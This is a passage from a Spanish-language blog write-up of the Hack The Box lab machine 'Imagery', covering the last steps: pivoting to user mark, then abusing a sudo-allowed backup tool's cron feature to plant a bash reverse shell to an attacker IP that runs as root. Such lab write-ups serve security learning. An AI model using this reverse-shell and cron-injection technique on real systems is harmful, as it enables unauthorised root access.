            </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"84e3c804cf1fa14306f26f9f3da177e0"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"displayId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"7be291d4"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
            </span><span class="nl">"failed_login_attempts"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"locked_until"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="nl">"isTestuser"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="nl">"images"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
    </span><span class="nl">"bug_reports"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
    </span><span class="nl">"image_collections"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"My Images"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unsorted"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Converted"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Transformed"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery36.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery36.png" alt="" loading="lazy"></a></p>

<h3 id="shell-como-mark"><span class="me-2">Shell como mark</span><a href="#shell-como-mark" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Esta contraseña es de mark, nos sirve para pivotear a este usuario y seguir enumerando para conseguir el <code class="language-plaintext highlighter-rouge">root</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>mark@Imagery:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rw-r-----</span> 1 root mark 33 Oct 27 12:17 user.txt
mark@Imagery:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
db6acff4c693ac960b8bd818e411ea1e
</pre></td></tr></tbody></table></code></div></div>

<h3 id="sudo"><span class="me-2">SUDO</span><a href="#sudo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>mark@Imagery:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mark on Imagery:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User mark may run the following commands on Imagery:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/charcol
</pre></td></tr></tbody></table></code></div></div>

<p>Podemos ejecutar como root esta herramienta, vamos a ver como funciona.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>mark@Imagery:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/charcol <span class="nt">-h</span>
usage: charcol.py <span class="o">[</span><span class="nt">--quiet</span><span class="o">]</span> <span class="o">[</span><span class="nt">-R</span><span class="o">]</span> <span class="o">{</span>shell,help<span class="o">}</span> ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  <span class="o">{</span>shell,help<span class="o">}</span>          Available commands
    shell               Enter an interactive Charcol shell.
    <span class="nb">help                </span>Show <span class="nb">help </span>message <span class="k">for </span>Charcol or a specific command.

options:
  <span class="nt">--quiet</span>               Suppress all informational output, showing only warnings and errors.
  <span class="nt">-R</span>, <span class="nt">--reset-password-to-default</span>
                        Reset application password to default <span class="o">(</span>requires system password verification<span class="o">)</span><span class="nb">.</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Podemos conseguir una shell pero en la herramienta</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
</pre></td><td class="rouge-code"><pre>mark@Imagery:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

<span class="o">[</span>2025-10-27 15:44:54] <span class="o">[</span>INFO] Entering Charcol interactive shell. Type <span class="s1">'help'</span> <span class="k">for </span>commands, <span class="s1">'exit'</span> to quit.
charcol&gt; <span class="nb">help
</span>charcol&gt; <span class="nb">help</span>
<span class="o">[</span>2025-10-27 15:44:59] <span class="o">[</span>INFO] 
Charcol Shell Commands:

  Backup &amp; Fetch:
    backup <span class="nt">-i</span> &lt;paths...&gt; <span class="o">[</span><span class="nt">-o</span> &lt;output_file&gt;] <span class="o">[</span><span class="nt">-p</span> &lt;file_password&gt;] <span class="o">[</span><span class="nt">-c</span> &lt;level&gt;] <span class="o">[</span><span class="nt">--type</span> &lt;archive_type&gt;] <span class="o">[</span><span class="nt">-e</span> &lt;patterns...&gt;] <span class="o">[</span><span class="nt">--no-timestamp</span><span class="o">]</span> <span class="o">[</span><span class="nt">-f</span><span class="o">]</span> <span class="o">[</span><span class="nt">--skip-symlinks</span><span class="o">]</span> <span class="o">[</span><span class="nt">--ask-password</span><span class="o">]</span>
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a <span class="s1">'.aes'</span> extension <span class="k">if </span>encrypted. Defaults to <span class="s1">'/var/backup/'</span><span class="nb">.</span>
      Naming: Automatically adds timestamp unless <span class="nt">--no-timestamp</span> is used. If no <span class="nt">-o</span>, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If <span class="s1">'--app-password'</span> is <span class="nb">set</span> <span class="o">(</span>status 1<span class="o">)</span> and no <span class="s1">'-p &lt;file_password&gt;'</span> is given, uses the application password <span class="k">for </span>encryption.
        - If <span class="s1">'no password'</span> mode is <span class="nb">set</span> <span class="o">(</span>status 2<span class="o">)</span> and no <span class="s1">'-p &lt;file_password&gt;'</span> is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup <span class="nt">-i</span> /home/user/my_docs /var/log/nginx/access.log <span class="nt">-o</span> /tmp/web_logs <span class="nt">-p</span> &lt;file_password&gt; <span class="nt">--verbose</span> <span class="nt">--type</span> tar.gz <span class="nt">-c</span> 9
        - Encrypted with app password <span class="o">(</span><span class="k">if </span>status 1<span class="o">)</span>:
          backup <span class="nt">-i</span> /home/user/example_file.json
        - Unencrypted <span class="o">(</span><span class="k">if </span>status 2 and no <span class="nt">-p</span><span class="o">)</span>:
          backup <span class="nt">-i</span> /home/user/example_file.json
        - No timestamp:
          backup <span class="nt">-i</span> /home/user/example_file.json <span class="nt">--no-timestamp</span>

    fetch &lt;url&gt; <span class="o">[</span><span class="nt">-o</span> &lt;output_file&gt;] <span class="o">[</span><span class="nt">-p</span> &lt;file_password&gt;] <span class="o">[</span><span class="nt">-f</span><span class="o">]</span> <span class="o">[</span><span class="nt">--ask-password</span><span class="o">]</span>
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a <span class="s1">'.aes'</span> extension <span class="k">if </span>encrypted. Defaults to <span class="s1">'/var/backup/fetched_file'</span><span class="nb">.</span>
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses <span class="o">(</span>e.g., localhost, 127.0.0.1<span class="o">)</span> is blocked.
      Encryption:
        - If <span class="s1">'--app-password'</span> is <span class="nb">set</span> <span class="o">(</span>status 1<span class="o">)</span> and no <span class="s1">'-p &lt;file_password&gt;'</span> is given, uses the application password <span class="k">for </span>encryption.
        - If <span class="s1">'no password'</span> mode is <span class="nb">set</span> <span class="o">(</span>status 2<span class="o">)</span> and no <span class="s1">'-p &lt;file_password&gt;'</span> is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch &lt;URL&gt; <span class="nt">-o</span> &lt;output_file_path&gt; <span class="nt">-p</span> &lt;file_password&gt; <span class="nt">--force</span>
        - Unencrypted <span class="o">(</span><span class="k">if </span>status 2 and no <span class="nt">-p</span><span class="o">)</span>:
          fetch &lt;URL&gt; <span class="nt">-o</span> &lt;output_file_path&gt;

  Integrity &amp; Extraction:
    list &lt;encrypted_file&gt; <span class="o">[</span><span class="nt">-p</span> &lt;file_password&gt;] <span class="o">[</span><span class="nt">--ask-password</span><span class="o">]</span>
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/&lt;encrypted_file_name&gt;.zip.aes <span class="nt">-p</span> &lt;file_password&gt;

    check &lt;encrypted_file&gt; <span class="o">[</span><span class="nt">-p</span> &lt;file_password&gt;] <span class="o">[</span><span class="nt">--ask-password</span><span class="o">]</span>
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/&lt;encrypted_file_name&gt;.tar.gz.aes <span class="nt">-p</span> &lt;file_password&gt;

    extract &lt;encrypted_file&gt; &lt;output_directory&gt; <span class="o">[</span><span class="nt">-p</span> &lt;file_password&gt;] <span class="o">[</span><span class="nt">--ask-password</span><span class="o">]</span>
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/&lt;encrypted_file_name&gt;.zip.aes /tmp/restored_data <span class="nt">-p</span> &lt;file_password&gt;

  Automated Jobs <span class="o">(</span>Cron<span class="o">)</span>:
    auto add <span class="nt">--schedule</span> <span class="s2">"&lt;cron_schedule&gt;"</span> <span class="nt">--command</span> <span class="s2">"&lt;shell_command&gt;"</span> <span class="nt">--name</span> <span class="s2">"&lt;job_name&gt;"</span> <span class="o">[</span><span class="nt">--log-output</span> &lt;log_file&gt;]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If <span class="s1">'--app-password'</span> is <span class="nb">set</span> <span class="o">(</span>status 1<span class="o">)</span>: Requires Charcol application password <span class="o">(</span>via global <span class="nt">--app-password</span> flag<span class="o">)</span><span class="nb">.</span>
        - If <span class="s1">'no password'</span> mode is <span class="nb">set</span> <span class="o">(</span>status 2<span class="o">)</span>: Requires system password verification <span class="o">(</span><span class="k">in </span>interactive shell<span class="o">)</span><span class="nb">.</span>
      Security Warning: Charcol does NOT validate the safety of the <span class="nt">--command</span><span class="nb">.</span> Use absolute paths.
      Examples:
        - Status 1 <span class="o">(</span>encrypted app password<span class="o">)</span>, cron:
          <span class="nv">CHARCOL_NON_INTERACTIVE</span><span class="o">=</span><span class="nb">true </span>charcol <span class="nt">--app-password</span> &lt;app_password&gt; auto add <span class="se">\</span>
          <span class="nt">--schedule</span> <span class="s2">"0 2 * * *"</span> <span class="nt">--command</span> <span class="s2">"charcol backup -i /home/user/docs -p &lt;file_password&gt;"</span> <span class="se">\</span>
          <span class="nt">--name</span> <span class="s2">"Daily Docs Backup"</span> <span class="nt">--log-output</span> &lt;log_file_path&gt;
        - Status 2 <span class="o">(</span>no app password<span class="o">)</span>, cron, unencrypted backup:
          <span class="nv">CHARCOL_NON_INTERACTIVE</span><span class="o">=</span><span class="nb">true </span>charcol auto add <span class="se">\</span>
          <span class="nt">--schedule</span> <span class="s2">"0 2 * * *"</span> <span class="nt">--command</span> <span class="s2">"charcol backup -i /home/user/docs"</span> <span class="se">\</span>
          <span class="nt">--name</span> <span class="s2">"Daily Docs Backup"</span> <span class="nt">--log-output</span> &lt;log_file_path&gt;
        - Status 2 <span class="o">(</span>no app password<span class="o">)</span>, interactive:
          auto add <span class="nt">--schedule</span> <span class="s2">"0 2 * * *"</span> <span class="nt">--command</span> <span class="s2">"charcol backup -i /home/user/docs"</span> <span class="se">\</span>
          <span class="nt">--name</span> <span class="s2">"Daily Docs Backup"</span> <span class="nt">--log-output</span> &lt;log_file_path&gt;
          <span class="o">(</span>will prompt <span class="k">for </span>system password<span class="o">)</span>

    auto list
      Purpose: List all automated <span class="nb">jobs </span>managed by Charcol.
      Example:
        auto list

    auto edit &lt;job_id&gt; <span class="o">[</span><span class="nt">--schedule</span> <span class="s2">"&lt;new_schedule&gt;"</span><span class="o">]</span> <span class="o">[</span><span class="nt">--command</span> <span class="s2">"&lt;new_command&gt;"</span><span class="o">]</span> <span class="o">[</span><span class="nt">--name</span> <span class="s2">"&lt;new_name&gt;"</span><span class="o">]</span> <span class="o">[</span><span class="nt">--log-output</span> &lt;new_log_file&gt;]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as <span class="s1">'auto add'</span><span class="nb">.</span>
      Example:
        auto edit &lt;job_id&gt; <span class="nt">--schedule</span> <span class="s2">"30 4 * * *"</span> <span class="nt">--name</span> <span class="s2">"Updated Backup Job"</span>

    auto delete &lt;job_id&gt;
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as <span class="s1">'auto add'</span><span class="nb">.</span>
      Example:
        auto delete &lt;job_id&gt;

  Shell &amp; Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    <span class="nb">exit
      </span>Purpose: Exit the Charcol shell.
      Example:
        <span class="nb">exit

    </span>clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    <span class="nb">help</span> <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
      Purpose: Show <span class="nb">help </span><span class="k">for </span>Charcol or a specific command.
      Example:
        <span class="nb">help </span>backup

Global Flags <span class="o">(</span>apply to all commands unless overridden<span class="o">)</span>:
  <span class="nt">--app-password</span> &lt;password&gt;    : Provide the Charcol <span class="k">*</span>application password<span class="k">*</span> directly. Required <span class="k">for</span> <span class="s1">'auto'</span> commands <span class="k">if </span>status 1. Less secure than interactive prompt.
  <span class="nt">-p</span>, <span class="s2">"--password"</span> &lt;password&gt;    : Provide the <span class="k">*</span>file encryption/decryption password<span class="k">*</span> directly. Overrides application password <span class="k">for </span>file operations. Less secure than <span class="nt">--ask-password</span><span class="nb">.</span>
  <span class="nt">-v</span>, <span class="s2">"--verbose"</span>                : Enable verbose output.
  <span class="nt">--quiet</span>                      : Suppress informational output <span class="o">(</span>show only warnings and errors<span class="o">)</span><span class="nb">.</span>
  <span class="nt">--log-file</span> &lt;path&gt;            : Log all output to a specified file.
  <span class="nt">--dry-run</span>                    : Simulate actions without actual file changes <span class="o">(</span><span class="k">for</span> <span class="s1">'backup'</span> and <span class="s1">'fetch'</span><span class="o">)</span><span class="nb">.</span>
  <span class="nt">--ask-password</span>               : Prompt <span class="k">for </span>the <span class="k">*</span>file encryption/decryption password<span class="k">*</span> securely. Overrides <span class="nt">-p</span> and application password <span class="k">for </span>file operations.
  <span class="nt">--no-banner</span>                   : Do not display the ASCII banner.
  <span class="nt">-R</span>, <span class="s2">"--reset-password-to-default"</span>  : Reset application password to default <span class="o">(</span>requires system password verification<span class="o">)</span><span class="nb">.</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Esta herramienta sirve para encriptar archivos como el que desciframos… zip.aes.</p>

<p>Luego de leer y analizar el tutorial de esta herramienta, note que la Automated Jobs (Cron) permite correr –command para programar el comando de respaldo. En lugar del comando de respaldo, puedo agregar una “revershell” aquí.</p>

<p>El comando es el siguiente, con –schedule para establecer el tiempo de ejecución del comando, –command el comando que se va a ejecutar y –name para nombrar este trabajo, finalmente agregue la IP de la maquina Kali y el puerto opcional.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>auto add <span class="nt">--schedule</span> <span class="s2">"* * * * *"</span> <span class="nt">--command</span> <span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'"</span> <span class="nt">--name</span> <span class="s2">"test"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Este comando lo va a ejecutar cada minuto asi que tenemos tiempo para ponernos en escucha.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>charcol&gt; auto add <span class="nt">--schedule</span> <span class="s2">"* * * * *"</span> <span class="nt">--command</span> <span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'"</span> <span class="nt">--name</span> <span class="s2">"test"</span>
<span class="o">[</span>2025-10-27 15:49:38] <span class="o">[</span>INFO] System password verification required <span class="k">for </span>this operation.
Enter system password <span class="k">for </span>user <span class="s1">'mark'</span> to confirm: 

<span class="o">[</span>2025-10-27 15:49:44] <span class="o">[</span>INFO] System password verified successfully.
<span class="o">[</span>2025-10-27 15:49:44] <span class="o">[</span>INFO] Auto job <span class="s1">'test'</span> <span class="o">(</span>ID: e2e5843e-2e6f-4add-9e4f-4a9993c573da<span class="o">)</span> added successfully. The job will run according to schedule.
<span class="o">[</span>2025-10-27 15:49:44] <span class="o">[</span>INFO] Cron line added: <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nv">CHARCOL_NON_INTERACTIVE</span><span class="o">=</span><span class="nb">true</span> /bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery37.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery37.png" alt="" loading="lazy"></a></p>

<p>Eso seria todo por la maquina Imagery de Hack The Box. GRACIAS!!!!!!!</p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/htb/">htb</a>,
          <a href="/categories/linux/">linux</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/linux/"
            class="post-tag no-text-decoration"
          >Linux</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >Web</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/conversor/">Conversor - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/imagery/">Imagery - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/editorial/">Editorial - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/runner/">Runner - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/stocker/">Stocker - Hack The Box</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/code/">Code</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/curl/">Curl</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/docker/">Docker</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">Execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/stocker/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760400000"
  data-df="ll"
  
>
  Oct 14, 2025
</time>

              <h4 class="pt-0 my-2">Stocker - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  
Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se ident...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/runner/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760659200"
  data-df="ll"
  
>
  Oct 17, 2025
</time>

              <h4 class="pt-0 my-2">Runner - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/editorial/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761004800"
  data-df="ll"
  
>
  Oct 21, 2025
</time>

              <h4 class="pt-0 my-2">Editorial - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Editorial es una máquina Linux de dificultad fácil que cuenta con una aplicación web de publicación vulnerable a Falsificación de Solicitud del Lado del Servidor (SSRF). Esta vulnerabilidad se ap...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/editorial/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Editorial - Hack The Box</p>
    </a>
  

  
    <a
      href="/posts/conversor/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Conversor - Hack The Box</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

